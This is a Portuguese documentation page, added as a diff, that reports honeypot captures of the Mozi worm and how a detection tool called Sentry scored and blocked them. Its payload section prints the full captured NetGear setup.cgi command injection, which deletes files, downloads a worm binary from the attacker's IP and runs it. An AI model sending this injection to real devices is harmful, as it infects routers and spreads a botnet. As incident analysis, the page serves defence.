@@ -1,0 +1,82 @@
+---
+title: "Propagação do worm Mozi"
+description: "Segunda e terceira capturas do worm Mozi, com o payload apontando para o próprio IP do atacante; 88/100 crítico, bloqueado, IP banido por 24h"
+---
+
+# Relato de incidente — autopropagação do worm Mozi (captura honeypot)
+
+> **Fonte original:**
+> [`incident-report-mozi-propagation.md`](https://github.com/IDjinn/sentry/blob/main/examples/incident-report-mozi-propagation.md)
+> no repositório.
+
+Par de [Mozi: tentativa de RCE](./mozi-rce). Segunda e terceira aparições
+do mesmo payload de worm contra um deployment honeypot de produção do
+Sentry; os IPs dos atacantes estão parcialmente mascarados.
+
+## TL;DR
+
+Três dias após a primeira captura de Mozi, o mesmo worm de injeção de
+comando NetGear atingiu o honeypot novamente a partir de outro host
+infectado — desta vez com a URL de download do payload apontando para o
+**próprio endereço IP do atacante**, a impressão digital de um worm em
+autopropagação ativa. Mesmo resultado de antes: **88/100 crítico, bloqueado
+na edge com 403**, IP banido por 24h. Duas infecções independentes, cadeia
+de detecção idêntica, zero execuções.
+
+## Resumo do evento
+
+| Campo | Valor |
+| --- | --- |
+| Timestamp | 2026-10-08 07:52:33 UTC |
+| Fonte | `http_proxy` (edge inline, porta 80) |
+| Atacante | `153.117.66.xxx` (mascarado, faixa APNIC) |
+| Método / Path | `GET /setup.cgi` |
+| Score de risco | 88 — **crítico** |
+| Verdict | **block** (HTTP 403) |
+| Desfecho | IP banido por 24h (`ip_state`, motivo `rce`) |
+
+Detalhe notável: 0,7s antes da requisição HTTP, o listener TCP da edge já
+havia registrado um evento de conexão pura do mesmo IP — o worm conecta
+primeiro e fala HTTP depois, e ambas as camadas de telemetria o capturaram.
+
+## O payload
+
+```
+GET /setup.cgi?next_file=netgear.cfg&todo=syscmd
+    &cmd=rm -rf /tmp/*;wget http://153.117.66.xxx:33581/Mozi.m -O /tmp/netgear;sh netgear
+    &curpath=/&currentsetting.htm=1
+```
+
+Compare com a primeira captura ([Mozi: tentativa de RCE](./mozi-rce)), em
+que a URL de download apontava para `192.168.1.1:8088` — o gateway do
+próprio roteador infectado. Aqui a URL embute o **IP público do atacante em
+uma porta alta** (`:33581`), ou seja: este nó roda seu próprio servidor de
+distribuição do Mozi e o worm está se propagando de host para host pela
+internet. Cada dispositivo infectado re-dispara a mesma injeção contra todo
+endpoint HTTP que escaneia.
+
+## Como o Sentry detectou
+
+Cadeia idêntica à da primeira captura — a detecção é genérica, não uma
+assinatura de Mozi:
+
+1. Heurística `CmdInjection` sobre a query URL-decodificada → sinal `rce`,
+   peso 70
+2. User-Agent ausente → sinal `suspicious_u_a`, peso 10
+3. `/setup.cgi` não é rota conhecida → sinal `unknown_route`, peso 8
+
+Total **88/100 → crítico → verdict `block`** → 403 servido pela edge,
+requisição nunca repassada, ban de 24h do IP registrado antes do próximo
+pacote poder chegar.
+
+## Por que isto demonstra eficácia
+
+- **Consistência entre infecções.** Dois hosts comprometidos não
+  relacionados, uma assinatura comportamental, o mesmo desfecho automático
+  — nenhum ajuste foi feito entre as capturas.
+- **A propagação do worm é auto-identificadora.** Payloads que embutem o
+  próprio endereço de C2 são triviais para uma heurística genérica de
+  injeção de comando; não é preciso rastrear a infraestrutura do botnet.
+- **Telemetria em camadas.** O evento de conexão TCP e a requisição HTTP
+  são persistidos, então a linha do tempo do incidente começa 0,7s antes do
+  próprio ataque.
